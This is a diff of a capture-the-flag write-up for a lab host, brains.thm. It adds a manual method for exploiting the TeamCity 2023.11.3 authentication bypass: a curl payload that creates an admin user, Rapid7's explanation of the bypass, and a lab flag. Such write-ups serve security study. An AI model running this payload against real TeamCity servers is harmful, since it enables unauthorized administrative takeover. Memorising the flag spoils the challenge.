@@ -56,7 +56,7 @@ There is one login page on port `50000`
 
 ![](../../../assets/images/Pasted%20image%2020251101170127.png)
 
-I just Noticed Version `2023.11.3` so searched it immediately and found this on rapid7
+I just Noticed Version `2023.11.3` so searched it immediately and found this on [rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)
 
 ![](../../../assets/images/Pasted%20image%2020251101170143.png)
 
@@ -136,8 +136,33 @@ THM{faa9bac345709b6620a6200b484c7594}
 ```
 
 ---
-# Method 2
+# Method 2 (Manual)
 
+As mentioned before, the version `teamcity 2023.11.3` is in use.
+To add a user with the administrator role manually, the following payload could be used, but it still needs to be adapted for our use.
+```bash
+curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/users;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"haxor\", \"password\": \"haxor\", \"email\": \"haxor\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
+```
+
+What is happening here?
+> To leverage this vulnerability to successfully call the authenticated endpoint `/app/rest/server`, an unauthenticated attacker must satisfy the following three requirements during an HTTP(S) request:
+>- Request an unauthenticated resource that generates a 404 response. This can be achieved by requesting a non existent resource, e.g.:
+    `/hax`
+>- Pass an HTTP query parameter named jsp containing the value of an authenticated URI path. This can be achieved by appending an HTTP query string, e.g.:
+     `?jsp=/app/rest/server`
+>- Ensure the arbitrary URI path ends with .jsp. This can be achieved by appending an HTTP path parameter segment, e.g.:
+     `;.jsp`
+Combining the above requirements, the attacker’s URI path becomes:
+	`/hax?jsp=/app/rest/server;.jsp`
+By using the authentication bypass vulnerability, we can successfully call this authenticated endpoint with no authentication.
+>
+> ```
+> C:\Users\sfewer>curl -ik http://172.29.228.65:8111/hax?jsp=/app/rest/server;.jsp
+> ```
+
+```
+curl -ik 'http://brains.thm:50000/hax?jsp=/app/rest/server;.jsp'
+```
 
 ---
 
